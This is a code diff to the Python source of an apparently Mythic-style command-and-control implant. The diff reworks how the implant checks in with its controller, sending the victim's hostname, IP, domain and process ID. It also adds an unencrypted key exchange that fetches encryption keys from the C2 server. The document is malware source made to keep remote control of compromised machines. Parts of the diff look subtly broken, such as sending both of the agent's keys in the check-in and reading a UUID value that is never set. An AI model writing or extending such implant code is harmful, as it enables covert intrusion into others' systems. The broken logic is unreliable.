@@ -159,8 +159,14 @@ CRYPTO_MODULE_PLACEHOLDER
     
     def checkIn(self):
         hostname = socket.gethostname()
-        ip = socket.gethostbyname(hostname) if hostname else ''
+        ip = ''
+        if hostname and len(hostname) > 0:
+            try:
+                ip = socket.gethostbyname(hostname)
+            except:
+                pass
 
+        # Standard check-in with encryption keys (now received from translation container)
         data = {
             "action": "checkin",
             "ip": ip,
@@ -170,50 +176,29 @@ CRYPTO_MODULE_PLACEHOLDER
             "domain": socket.getfqdn(),
             "pid": os.getpid(),
             "uuid": self.agent_config["PayloadUUID"],
-            "architecture": "x64" if sys.maxsize > 2**32 else "x86"
-            # Removed static keys from initial checkin
+            "architecture": "x64" if sys.maxsize > 2**32 else "x86",
+            "encryption_key": base64.b64encode(self.agent_config["enc_key"]["enc_key"]).decode(),
+            "decryption_key": base64.b64encode(self.agent_config["enc_key"]["dec_key"]).decode()
         }
-
-        # Encrypt with initial static key
-        encrypted_data = self.encrypt(json.dumps(data).encode())
-        encoded_data = base64.b64encode(self.agent_config["PayloadUUID"].encode() + encrypted_data)
         
-        # Send initial checkin
-        response = self.makeRequest(encoded_data, 'POST')
-        if not response:
+        # Use existing formatMessage (which encrypts) and formatResponse (which decrypts)
+        encoded_data = base64.b64encode(self.agent_config["UUID"].encode() + self.encrypt(json.dumps(data).encode()))
+        decoded_data = self.decrypt(self.makeRequest(encoded_data, 'POST'))
+        
+        if not decoded_data:
             return False
-
-        # Decrypt response with static key
-        decrypted_response = self.decrypt(response)
-        if not decrypted_response:
-            return False
-
         try:
-            # Remove UUID prefix and parse JSON
-            json_response = decrypted_response.replace(self.agent_config["PayloadUUID"], "", 1)
-            response_data = json.loads(json_response)
-            
-            if response_data.get("status") == "success":
-                # Extract new keys from response
-                new_enc_key = base64.b64decode(response_data["enc_key"])
-                new_dec_key = base64.b64decode(response_data["dec_key"])
-                
-                # Debug output
-                print(f"[Agent] Received new enc key: {base64.b64encode(new_enc_key).decode('utf-8')}")
-                print(f"[Agent] Received new dec key: {base64.b64encode(new_dec_key).decode('utf-8')}")
-                
-                # Update agent configuration with new keys
-                self.agent_config["enc_key"] = {
-                    "enc_key": new_enc_key,
-                    "dec_key": new_dec_key
-                }
-                self.agent_config["UUID"] = response_data["id"]
+            response_json = json.loads(decoded_data.replace(self.agent_config["UUID"], "", 1))
+            if "status" in response_json and "id" in response_json:
+                self.agent_config["UUID"] = response_json["id"]
                 return True
-        except Exception as e:
-            print(f"[Agent] Key update error: {str(e)}")
-        
-        return False
-        
+            else:
+                return False
+        except json.JSONDecodeError as e:
+            return False
+
+     
+
     def makeRequest(self, data, method='GET', max_retries=5, retry_delay=5):
         # Build headers
         hdrs = {}
@@ -289,6 +274,7 @@ CRYPTO_MODULE_PLACEHOLDER
 
         return ""
 
+
       
     def passedKilldate(self):
         kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
@@ -306,6 +292,34 @@ CRYPTO_MODULE_PLACEHOLDER
         time.sleep(self.agent_config["Sleep"]+j)
 
 #COMMANDS_PLACEHOLDER
+    def performKeyExchange(self):
+        """Perform initial key exchange with translation container via C2."""
+        try:
+            # Send key request message
+            key_request = {
+                "action": "key_exchange",
+                "agent_id": self.agent_config["PayloadUUID"],
+                "crypto_type": "aes256"
+            }
+            
+            # Send unencrypted key request
+            encoded_request = base64.b64encode(json.dumps(key_request).encode())
+            response_data = self.makeRequest(encoded_request, 'POST')
+            
+            if response_data:
+                response_json = json.loads(base64.b64decode(response_data).decode())
+                
+                if "enc_key" in response_json and "dec_key" in response_json:
+                    # Keys are delivered as base64 encoded strings
+                    self.agent_config["enc_key"] = {
+                        "enc_key": base64.b64decode(response_json["enc_key"]),
+                        "dec_key": base64.b64decode(response_json["dec_key"])
+                    }
+                    return True
+            return False
+            
+        except Exception as e:
+            return False
 
 
     def __init__(self):
@@ -326,15 +340,18 @@ CRYPTO_MODULE_PLACEHOLDER
             "Sleep": callback_interval,
             "Jitter": callback_jitter,
             "KillDate": "killdate",
-            "enc_key": AESPSK,
-            "ExchChk": "encrypted_exchange_check",
             "GetURI": "/get_uri",
             "GetParam": "query_path_name",
             "ProxyHost": "proxy_host",
             "ProxyUser": "proxy_user",
             "ProxyPass": "proxy_pass",
             "ProxyPort": "proxy_port",
+            "enc_key": None,
+            "dec_key": None
         }
+
+        if not self.performKeyExchange():
+            os._exit(1)
         max_checkin_retries = 10
         checkin_retry_delay = 30
 
@@ -373,7 +390,7 @@ CRYPTO_MODULE_PLACEHOLDER
                             pass
                     self.agentSleep()   
         except KeyboardInterrupt:
-            self.exit(0)                
+            self.exit(0)               
 
 if __name__ == "__main__":
     igider = igider()
